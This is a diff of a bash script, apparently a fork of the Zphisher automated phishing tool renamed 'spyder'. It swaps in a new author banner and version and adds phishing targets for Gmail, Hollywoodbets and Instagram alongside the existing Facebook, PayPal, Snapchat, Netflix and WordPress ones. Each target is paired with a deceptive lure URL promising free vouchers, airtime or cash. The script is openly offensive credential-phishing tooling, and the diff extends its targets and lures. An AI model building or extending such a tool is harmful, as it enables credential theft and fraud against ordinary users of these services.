@@ -1,9 +1,9 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.2
-##   Github 	: 	https://github.com/htr-tech
+##   spyder 	: 	Automated Phishing Tool
+##   Author 	: 	Cold-Breazy
+##   Version 	: 	3.0
+##   Github 	: 	https://github.com/cold-breazy
 
 
 ## ANSI colors (FG & BG)
@@ -30,11 +30,13 @@ fi
 ## Script termination
 exit_on_signal_SIGINT() {
     { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+    sleep 0.7
     exit 0
 }
 
 exit_on_signal_SIGTERM() {
     { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+    sleep 0.7
     exit 0
 }
 
@@ -212,7 +214,7 @@ about() {
 		${GREEN}Author   ${RED}:  ${ORANGE}MANDISA ${RED}[ ${ORANGE}COLD-BREAZY ${RED}]
 		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/cold-breazy
 		${GREEN}Social   ${RED}:  ${CYAN}https://www.facebook.com/Mothalicious
-		${GREEN}Version  ${RED}:  ${ORANGE}2.0
+		${GREEN}Version  ${RED}:  ${ORANGE}3.0
 
 		${REDBG}${WHITE} Thanks : Junio Jays & Tee Viper!${RESETBG}
 
@@ -518,8 +520,9 @@ main_menu() {
              
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}03${RED}]${ORANGE} Snapchat        ${RED}[${WHITE}05${RED}]${ORANGE} NetFlix
-		${RED}[${WHITE}02${RED}]${ORANGE} Paypal        ${RED}[${WHITE}04${RED}]${ORANGE} Cam Hack        ${RED}[${WHITE}06${RED}]${ORANGE} Wordpress
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit            ${RED}[${WHITE}UP${RED}]${ORANGE} Update 
+		${RED}[${WHITE}02${RED}]${ORANGE} Paypal        ${RED}[${WHITE}04${RED}]${ORANGE} Gmail           ${RED}[${WHITE}06${RED}]${ORANGE} Wordpress
+		${RED}[${WHITE}07${RED}]${ORANGE} Hollywoodbets ${RED}[${WHITE}08${RED}]${ORANGE} Instagram       ${RED}[${WHITE}UP${RED}]${ORANGE} Update
+${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit            
 
 	EOF
 	
@@ -540,9 +543,7 @@ main_menu() {
                         mask='https://earn-money-from-snapchat'
                         tunnel_menu;;
 		4 | 04)
-			website="cam"
-			mask='https://mtn-R366-airtime-by-allowing-photos'
-			tunnel_menu;;
+			site_gmail;;
 		5 | 05)
 			website="netflix"
 			mask='http://upgrade-your-netflix-plan-free'
@@ -551,7 +552,12 @@ main_menu() {
 			website="wordpress"
 			mask='http://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		
+                7 | 07)
+                       website="hollywood"
+                       mask='https://hollywoodbets-free-R250-Voucher'
+                       tunnel_menu;;
+                8 | 08)
+                      site_instagram;;
 		99)
 			about;;
 		0 | 00 )
